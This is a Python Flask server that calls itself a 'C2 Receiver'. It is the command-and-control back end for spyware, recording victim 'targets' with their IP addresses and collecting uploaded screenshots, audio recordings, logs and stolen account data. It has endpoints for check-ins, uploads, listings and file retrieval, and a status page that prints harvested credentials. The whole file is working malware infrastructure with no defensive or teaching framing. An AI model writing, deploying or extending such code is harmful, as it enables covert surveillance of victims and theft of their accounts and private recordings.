import os
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from werkzeug.utils import secure_filename

app = Flask(__name__)
UPLOAD_ROOT = "uploads"
os.makedirs(UPLOAD_ROOT, exist_ok=True)
INDEX_FILE = os.path.join(UPLOAD_ROOT, "index.json")

def load_index():
    if os.path.exists(INDEX_FILE):
        try:
            with open(INDEX_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return {"targets": {}}

def save_index(data):
    with open(INDEX_FILE, "w") as f:
        json.dump(data, f, indent=2)

@app.route("/")
def home():
    idx = load_index()
    targets = idx.get("targets", {})
    lines = ["C2 Receiver Online", f"Time: {datetime.now()}", f"Targets: {len(targets)}", ""]
    for tid, data in targets.items():
        lines.append(f"=== {tid} ===")
        lines.append(f"First: {data.get('first_seen')}")
        lines.append(f"Last:  {data.get('last_seen')}")
        lines.append(f"IP:    {data.get('ip', '?')}")
        lines.append(f"Shots: {len(data.get('screenshots', []))}")
        lines.append(f"Audio: {len(data.get('audio', []))}")
        lines.append(f"Logs:  {len(data.get('logs', []))}")
        if data.get("accounts"):
            lines.append("--- accounts ---")
            lines.append(data["accounts"][:2000])
        lines.append("")
    return "<pre>" + "\n".join(lines) + "</pre>"

@app.route("/upload", methods=["POST"])
def upload():
    target_id = request.form.get("target_id", "unknown")
    file_type = request.form.get("file_type", "misc")
    f = request.files.get("file")
    if not f:
        return jsonify({"error": "no file"}), 400

    target_dir = os.path.join(UPLOAD_ROOT, secure_filename(target_id), secure_filename(file_type))
    os.makedirs(target_dir, exist_ok=True)
    filename = secure_filename(f.filename)
    path = os.path.join(target_dir, filename)
    f.save(path)

    idx = load_index()
    t = idx["targets"].setdefault(target_id, {
        "first_seen": str(datetime.now()),
        "screenshots": [], "audio": [], "logs": [], "accounts": ""
    })
    t["last_seen"] = str(datetime.now())
    t["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)

    if file_type == "screenshots":
        if filename not in t["screenshots"]:
            t["screenshots"].append(filename)
    elif file_type == "audio":
        if filename not in t["audio"]:
            t["audio"].append(filename)
    elif file_type == "logs":
        if filename not in t["logs"]:
            t["logs"].append(filename)
    elif file_type == "accounts":
        try:
            with open(path, "r", errors="ignore") as fh:
                t["accounts"] = fh.read()[-4000:]
        except Exception:
            pass

    save_index(idx)
    return jsonify({"status": "ok", "saved": filename})

@app.route("/file/<target_id>/<file_type>/<filename>")
def serve_file(target_id, file_type, filename):
    directory = os.path.join(UPLOAD_ROOT, secure_filename(target_id), secure_filename(file_type))
    return send_from_directory(directory, secure_filename(filename))

@app.route("/list/<target_id>")
def list_files(target_id):
    idx = load_index()
    t = idx["targets"].get(target_id)
    if not t:
        return jsonify({"error": "unknown target"}), 404
    return jsonify(t)

@app.route("/ping", methods=["POST"])
def ping():
    target_id = request.form.get("target_id", "unknown")
    idx = load_index()
    t = idx["targets"].setdefault(target_id, {
        "first_seen": str(datetime.now()),
        "screenshots": [], "audio": [], "logs": [], "accounts": ""
    })
    t["last_seen"] = str(datetime.now())
    t["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
    save_index(idx)
    return jsonify({"status": "pong"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)